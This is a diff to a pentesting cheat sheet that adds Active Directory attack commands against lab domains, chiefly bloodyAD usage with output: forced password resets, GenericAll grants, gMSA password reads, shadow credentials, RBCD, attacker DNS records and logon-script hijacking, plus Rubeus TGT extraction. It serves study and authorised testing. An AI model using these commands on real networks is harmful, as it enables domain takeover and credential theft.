@@ -1190,6 +1190,7 @@ bloodhound-python -d DOMAIN.LOCAL -u USER -p 'PASS' -dc DC01 -c All
 #If clock skew error appears try this:
 sudo set-ntp off
 rdate -n <dc-ip>
+sudo ntpdate <ip>
 
 #Another Option is faketime
 sudo ntpdate -q <dc-ip>
@@ -1213,6 +1214,18 @@ netexec smb 10.129.232.167 -u alfred -p 'password' -d tombwatcher.htb
 #netexec smb -u '' -p '' -L to check modules
 # Extracts privileges assigned via GPOs and resolves SIDs via LDAP.
 netexec smb 172.16.8.3 -u <user> -p <Str0ngpass86!> -M gpp_autologin
+
+#Retreive a tgt
+./Rubeus.exe tgtdeleg /nowrap
+ 
+ echo "base64" | base64 -d > tgt.kirbi
+ 
+ 
+ ticketConverter.py tgt.kirbi tgt.ccache
+ 
+ 
+ export KRB5CCNAME=tgt.ccache
+
 ```
 ##### LLMNR Poisoning
 ```
@@ -1402,6 +1415,233 @@ Get-ADTrust -Filter * | select name
 # PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
 Get-ADGroupMember -Identity "Backup Operators"
 ```
+##### bloodyAD cheat-sheet 
+
+```
+https://seriotonctf.github.io/BloodyAD-Cheatsheet/index.html
+https://github.com/CravateRouge/bloodyAD/wiki/Enumeration
+
+uv tool install bloodyAD
+Using pipx
+
+pipx install bloodyAD
+Retrieve User Information
+bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
+Example:
+
+$ bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p P@ssword1 get object administrator
+
+distinguishedName: CN=Administrator,CN=Users,DC=redelegate,DC=vl
+accountExpires: 1601-01-01 00:00:00+00:00
+adminCount: 1
+cn: Administrator
+description: Built-in account for administering the computer/domain
+userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED
+Add User To Group
+bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
+Example:
+
+$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'it-computer3$' -k add groupMember helpdesk 'it-computer3$'
+[+] it-computer3$ added to helpdesk
+Change Password
+bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
+Example:
+
+$ bloodyAD --host DC1.KLENDATHU.VL -d KLENDATHU.VL -u rasczak -p P@ssword1 set password RICO NewP@ssw0rd
+[+] Password changed successfully!
+Give User GenericAll Rights
+bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
+Example:
+
+$ bloodyAD --host dc01.rebound.htb -d rebound.htb -u oorend -p 'P@ssword1' add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
+[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+Using the SID:
+
+$ bloodyAD --host dc01.rebound.htb -d rebound.htb -u oorend -p 'P@ssword1' add genericAll 'S-1-5-21-2410575906-3092493790-2123333151-1104' 'S-1-5-21-750635624-2058721901-1932338391-2617'
+[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on S-1-5-21-2410575906-3092493790-2123333151-1104
+WriteOwner
+bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
+Example:
+
+$ bloodyAD --host dc01.haze.htb -d dc01.haze.htb -u 'P@ssword1$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' set owner SUPPORT_SERVICES 'Haze-IT-Backup$'
+[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES
+ReadGMSAPassword
+bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
+Example:
+
+$ bloodyAD --host dc01.vintage.htb -d vintage.htb -u 'fs01$' -p 'P@ssw0rd' -k get object 'gMSA01$' --attr msDS-ManagedPassword
+
+distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:54311f0ed05b807a7aaf5943b595f224
+msDS-ManagedPassword.B64ENCODED: c6qwf6x+EXiEYKGhCu/wTBcnp6hz3ppQG2uReaV8QV+JCaIhn2MobwBxF4Q6fd3W5P13wvh2Jf/Wp2WHsjIEjkbF0duDHoCBAK31Q+BoQg0eUHbsRcksNrkLcPtkZ5eUhK+TzgpXeFKt0VCOWFkAOStKE1H5PDfUGoC2xuP+Tceg7iV0IcMBaR8Db3UgqaqP2LLRiimuL6ZO4xl6sSRKrdRQEQOR7L9fFw9JW7myCsbj2TPxFc5WaMQtWi456OvwBQn4jhdty5tSjv2uMlcq+sQMz60voxH6sClACPGKJMCr2FNVJP6dd1GTdvh6n5Dbh/yhHCAF8UzYeGXv2Nx3Dw==
+
+Enable a Disabled Account
+bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
+Example:
+
+$ bloodyAD --host dc01.mirage.htb -d mirage.htb -u mark.bbond -p '1day@atime' -k remove uac javier.mmarshall -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
+Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
+bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION
+Example:
+
+$ bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p 'P@ssword1' -k add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
+[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
+Modify UPN
+bloodyAD --host $dc -d $domain -u $username -p $password set object $old_upn userPrincipalName -v $new_upn
+Example:
+
+$ bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p 'P@ssword1' set object angela.w userPrincipalName -v angela.w.adm
+[+] angela.w's userPrincipalName has been updated
+Check if it has been modified
+
+bloodyAD --host $dc -d $domain -u $username -p $password get object $target_user --attr userPrincipalName
+Example:
+
+$ bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w --attr userPrincipalName
+
+distinguishedName: CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb
+userPrincipalName: angela.w.adm
+MachineAccountQuota
+Enumerate MachineAccountQuota
+
+bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota
+Example:
+
+$ bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u administrator -p ':5616465165165' get object 'DC=darkcorp,DC=htb' --attr ms-DS-MachineAccountQuota
+
+distinguishedName: DC=darkcorp,DC=htb
+ms-DS-MachineAccountQuota: 0
+Set MachineAccountQuota value to 10
+
+bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10
+Example:
+
+$ bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u administrator -p ':651651651651651651' set object 'DC=darkcorp,DC=htb' ms-DS-MachineAccountQuota -v 10
+[+] DC=darkcorp,DC=htb's ms-DS-MachineAccountQuota has been updated
+Modify the email
+bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local
+Example:
+
+$ bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p P@ssw0rd set object d.baker mail -v h.brown@scepter.htb
+[+] d.baker's mail has been updated
+Modify the altSecurityIdentities attribute (ESC14B)
+bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'
+Example:
+
+$ bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>p.adams@scepter.htb'
+[+] p.adams's altSecurityIdentities has been updated
+Find Writable Attributes
+bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
+Example:
+
+$ bloodyAD --host dc01.scepter.htb -d scepter.htb -u 'h.brown' -k get writable --detail
+
+distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
+altSecurityIdentities: WRITE
+Shadow Credentials
+bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
+Example:
+
+$ bloodyAD --host haze.htb -d haze.htb -u 'haze-it-backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -s add shadowCredentials 'edward.martin'
+WriteSPN
+bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
+Example:
+
+$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u henry -p '6516464651!' set object alfred servicePrincipalName -v 'tombwatcher/meow'
+[+] alfred's servicePrincipalName has been updated
+Find Deleted Objects
+bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
+Example:
+
+$ bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 16516846516541 -k get writable --include-del
+
+distinguishedName: CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+permission: CREATE_CHILD; WRITE
+Extended Search Operations
+bloodyAD --host $dc -d $domain -u $username -p $password get search -h
+e.g.
+
+-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 to display tombstoned
+bloodyAD --host $dc -d $domain -u $username -p $password -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
+Restore a deleted object
+bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
+Example:
+
+$ bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 654984651968 -k set restore todd.wolfe
+[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
+Create a new computer account
+bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
+Example:
+
+$ bloodyAD --host DC1.delegate.vl -d delegate.vl -u n.thompson -p '4646516854' add computer meow 'P@ssw0rd'
+[+] meow created
+Add Resource Based Constrained Delegation
+bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
+Example:
+
+$ bloodyAD --host dc2.domain.local -d domain.local -u 'C.Carlssen' -k add rbcd svc_sql 'meow$'
+[!] No security descriptor has been returned, a new one will be created
+[+] meow$ can now impersonate users on svc_sql via S4U2Proxy
+Register a DNS Record
+bloodyAD --host $dc -d $domain -u $username -p $password add dnsRecord $record_name $attacker_ip
+Example:
+
+$ bloodyAD --host S200401.overwatch.htb -u sqlsvc -p 65654654961 add dnsRecord SQL07 10.10.14.61
+[+] SQL07 has been successfully added
+Overwrite the logon script path
+bloodyAD --host $dc -d $domain -u $username -p $password set object $DN scriptPath -v $file
+Example:
+
+$ bloodyAD --host garfield.htb -d garfield.htb -u j.arbuckle -p '461646158' set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v 'printerDetect.bat'
+[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
+Collect Bloodhound data
+bloodyAD --host $dc -d $domain -u $username -p $password get bloodhound
+Example:
+
+$ bloodyAD --host DC2.pong.htb -d pong.htb --dc-ip 192.168.2.2 -u c.roberts -k get bloodhound
+[+] Connecting to LDAP server
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:00,  5.33it/s]
+Generating lookuptable: 96it [00:00, 102.83it/s]
+Dumping SDs:  99%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▌ | 99/100 [00:09<00:00,  9.98it/s]
+Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  3.66it/s]
+Dumping users: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 16/16 [00:00<00:00, 112.13it/s]
+Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 21.41it/s]
+Dumping groups: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 52/52 [00:00<00:00, 328.41it/s]
+Dumping GPOs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3/3 [00:00<00:00, 31.36it/s]
+Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 23.38it/s]
+Dumping Containers: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 99.91it/s]
+[+] Bloodhound data saved to 20260426T192924_Bloodhound.zip
+[+] Found 1 trusts
+Change Group Type to Domain Local
+bloodyAD --host $dc -d $domain -u $username -p $password set object $group groupType -v -2147483644
+Example:
+
+$ bloodyAD --host DC2.pong.htb -d pong.htb -u c.roberts -k set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644
+[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
+Get the msDS-ManagedPassword blob
+bloodyAD --host $dc -d $domain -u $username -p $password get search --filter '(sAMAccountName=account_name$)' --attr 'msDS-ManagedPassword,msDS-ManagedPasswordId,sAMAccountName' --raw
+Example:
+
+$ bloodyAD --host dc2.pong.htb -d pong.htb -u 'c.roberts@ping.htb' -k get search --filter '(sAMAccountName=Pong_gMSA$)' --attr 'msDS-ManagedPassword,msDS-ManagedPasswordId,sAMAccountName' --raw
+
+distinguishedName: CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb
+msDS-ManagedPassword: AQAAACQCAAAQABIBFAIcAnhZG1ix0PWawJDVD5CKMgZ7hrJ18mTj...[SNIP]
+msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAbAEAAAIAAAAAAAAAM1Hudw9yHvOOVt4ob5...[SNIP]
+sAMAccountName: Pong_gMSA$
+Notes
+Pass -k to use kerberos authentication.
+You can pass a user hash instead of a password using -p :hash.
+Specify format for --password or -k <keyfile> using -f, e.g. -f rc4.
+Resources
+https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
+https://0xdf.gitlab.io/2024/03/30/htb-rebound.html
+https://0xdf.gitlab.io/2025/04/26/htb-vintage.html
+https://www.thehacker.recipes/
+
+```
+
 ##### Kerberoasting
 ```
 WINDOWS -----------------------------------------------------------------------------------------------------------------------------------------------------
@@ -1498,6 +1738,8 @@ GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'password' \
 
 ##### ACL Enumeration and Tactics
 ```
+bloodyAD --host 10.129.14.95 -d domain.htb -u user -p 'Password!' get writable
+
 # PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
 Find-InterestingDomainAcl
 
